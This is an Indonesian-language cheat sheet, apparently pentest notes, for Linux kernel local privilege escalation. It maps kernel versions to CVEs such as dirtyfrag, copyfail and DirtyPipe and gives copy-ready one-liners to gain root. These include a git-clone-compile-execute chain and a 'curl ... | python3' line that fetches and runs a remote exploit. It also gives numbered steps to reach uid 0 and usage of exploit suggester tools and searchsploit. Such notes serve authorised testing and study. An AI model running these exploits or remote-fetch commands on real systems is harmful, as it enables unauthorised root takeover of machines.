# Kernel LPE (Local Privilege Escalation)

## Modern Kernel LPE (dirtyfrag / copyfail)

LPE kernel TERBARU, DETERMINISTIK (bukan race). Cek kernel dulu:

```bash
uname -r
```

| Kernel | Vulnerable |
|--------|------------|
| Ubuntu 5.15.0-XXX (XXX < 181) | dirtyfrag (CVE-2026-43284/43500) + copyfail (CVE-2026-31431) |
| Debian 5.10.0-9 | DirtyPipe (CVE-2022-0847) + copyfail subset |

### DirtyFrag (CVE-2026-43284/43500)
```bash
# One-liner: clone, compile, execute
git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
```

> **Catatan:** dirtyfrag butuh modul esp4/esp6/rxrpc (cek: `lsmod` / `modinfo`)

### CopyFail (CVE-2026-31431)
```bash
# One-liner: download & execute
curl https://copy.fail/exp | python3 && su
```

### Langkah Umum
1. `uname -r` -> tentukan versi
2. Ambil PoC dari sumber publik (repo resmi penemu)
3. Compile di target (`gcc`) ATAU transfer binary yang cocok GLIBC
4. Jalankan -> root deterministik
5. Verifikasi: `id` (uid/euid=0)

## Linux Exploit Suggester

Tool otomatis untuk suggest kernel exploit berdasarkan versi kernel target.

### Sumber
- https://github.com/The-Z-Labs/linux-exploit-suggester (LES)
- https://github.com/jondonas/linux-exploit-suggester-2 (LES2 - Perl)

### Cara Pakai
```bash
# Di target: ambil versi kernel
uname -r

# Di Kali: run LES dengan kernel version dari target
./linux-exploit-suggester.sh --kernel <KERNEL_VERSION>
```

### Output
Tool akan menampilkan:
- Kernel version
- List CVE yang mungkin vulnerable
- Link ke exploit/PoC
- Tingkat exposure (highly probable, probable, less probable)

> Fokus pada hasil **[CVE-xxx] highly probable** terlebih dahulu.

## Kernel Exploit (umum)
```bash
uname -r                                     # versi kernel
searchsploit linux kernel <versi>            # cari exploit lokal
```

Contoh exploit populer:
- DirtyPipe (5.8 - 5.10.x)
- DirtyCOW (lama)
- PwnKit (pkexec)

Cross-check versi vs patch sebelum jalankan. Compile di target jika bisa.
